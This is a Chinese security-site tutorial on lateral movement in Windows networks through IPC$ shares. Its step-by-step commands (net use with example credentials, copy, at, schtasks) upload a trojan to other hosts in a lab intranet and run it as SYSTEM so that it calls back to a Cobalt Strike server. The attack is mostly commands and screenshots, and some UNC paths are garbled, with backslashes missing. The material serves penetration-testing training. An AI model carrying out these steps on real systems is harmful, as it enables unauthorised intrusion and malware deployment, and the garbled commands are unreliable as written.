---
title: 横向移动-IPC
url: https://www.secpulse.com/archives/195918.html
source: 安全脉搏
date: 2023-02-16
fetch_date: 2025-10-04T06:45:05.017982
---

# 横向移动-IPC

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 横向移动-IPC

[内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-02-15

17,791

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440082.png)

## 什么是IPC？

IPC（共享命名管道资源）其实就是为了实现进程间通信而开放的命名管道；它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。

## IPC的利用条件

1. 1. 获得用户名和密码
2. 2. 开放了139、445端口

IPC可以实现远程登录及对默认共享资源的访问，而139端口的开启标识NetBIOS协议的应用。通过139、445端口可以实现对共享文件/打印机的访问。

1. 3. 管理员开启了默认共享

默认共享是为了方便管理员进行远程管理而默认开启的，包括所有的逻辑盘（c$,d$,e$）等，和系统目录winnt或windows（admin$)。通过IPC可以实现对这些默认共享目录的访问。

## IPC在内网中的利用手法

### IPC基础命令

1. 1. 查看IPC连接与删除IPC连接

```
net use # 查看IPC连接
net use \serveripc$ /del  # 删除IPC连接
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440083.png "null")

1. 2. 建立IPC链接到目标主机

```
net use \server ipipc$ "password" /user:username   #工作组
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440085.png "null")

```
net use \server ipipc$ "password" /user:domainusername #域内主机
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440086.png "null")

1. 3. 查看文件列表

```
dir \server ipc$
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440087.png "null")

1. 4. 下载与复制文件

在下载文件这里，我们是可以看到192.168.3.32的C盘下是有一个IP.txt文件的，这里我们使用下载文件命令将其下载到我们的桌面。

```
copy \server ipc$1.ext 1.exe # 下载文件
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440088.png "null")

上传文件同样也是使用copy命令进行上传

```
copy 1.bat \server ipc$  # 上传文件
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440091.png "null")

1. 5. 查看文件内容

若是想要查看⽬标 C 盘下的 ip.txt ⽂件就可以使⽤ type 命令

```
type \192.168.3.32c$ip.txt
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440092.png "null")

### 计划任务执行命令

在实战中，我们建立了IPC连接后，可以上传木马文件然后使用计划任务将其上线，目前windows有两个计划任务命令，系统小于windows 2012的使用at命令，系统大于等于Windows server 2012的操作系统已经弃用了at命令使用schtasks命令。如下图，假设我们当前已经拿到了Web Server的主机权限，并成功与其内网的两台主机建立了IPC连接，这时我们想将这两台主机进行上线就需要考虑到刚刚提到的由于windows版本，该使用at还是schtasks计划让其运行木马这个问题。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440095.png "null")

#### AT

首先我们先将一个木马上传到我们的Web server中，由于内网主机不出网，所以这里要生成正向连接的木马或通过Web server中转上线的木马，这里使用的为中转上线生成的木马

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440096.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440097.png "null")

在建立IPC连接后，将木马上传到目标机器中，然后再使用AT创建计划任务将其执行上线

```
net use \192.168.3.21ipc$ "Admin12345" /user:administrator
copy 4444.exe \192.168.3.21c$
dir \192.168.3.21c$
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-16764400971.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440098.png "null")

这里我们可以看到4444.exe已经成功被我们上传到了目标机器中，这里我们先查看一下目标系统时间，然后在使用at 设置计划任务，执行我们的木马文件

```
net time \192.168.3.21 # 查看目标系统时间
at 192.168.3.21 16:40 C:4444.exe # 使用at计划任务执行C盘下的4444.exe
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440100.png "null")

这里可以通过at命令去查看当前计划任务情况，和删除计划任务，具体命令如下

```
at \192.168.3.21 1 # 查看at id=1 的计划任务
at \192.168.3.21 1 /delete # 删除at id=1 的计划任务
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440102.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440103.png "null")

到了19:10分后，我们可以看到通过at计划任务木马成功被执行，已经上线到了我们的CS中

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440104.png "null")

#### Schtasks

在windows server 2012及以后的操作系统已经弃用了at命令，转而使用schtasks命令，schtasks命令比at命令更加的灵活，但是在使用schtasks命令时，就会在系统中留下日志文件：C:Windows|Tasksxx.txt，这里不详细讲解schtasks的具体使用命令，只讲解在横向移动中，我们常用的操作命令。和AT命令一样，我们先和目标主机建立IPC连接，将木马上传到目标机器中，然后再使用schtasks命令执行木马程序

```
net use \192.168.3.32 "admin!@#45" /user:administrator
copy 4444.exe \192.168.3.32c$
dir \192.168.3.32c$
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-16764401041.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440105.png "null")

木马上传成功后，接下来就使用schtasks命令，schtasks命令与at命令不同，schtasks命令为先创建一个任务，然后再按需运行该任务，也可直接指定时间运行，但相对来说较于麻烦，所以这里使用按需运行任务，在创建了任务后直接让其运行即可

```
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn beacon /sc DAILY /tr c:4444.exe /F # 创建beacon任务对应执行文件，每天运行一次
schtasks /run /s 192.168.3.32 /tn beacon /i # 运行beacon服务
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440106.png "null")

这里可以通过schtasks命令去查看当前计划任务情况，和删除计划任务，具体命令如下

```
schtasks /query | findstr beacon # 查看beacon计划任务
schtasks /delete /s 192.168.3.32 /tn beacon /f # 删除beacon计划任务
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676440107.png "null")
![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-16764401071.png "null")

这里，使用schtasks也成功将SQLserver上线。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195918-1676...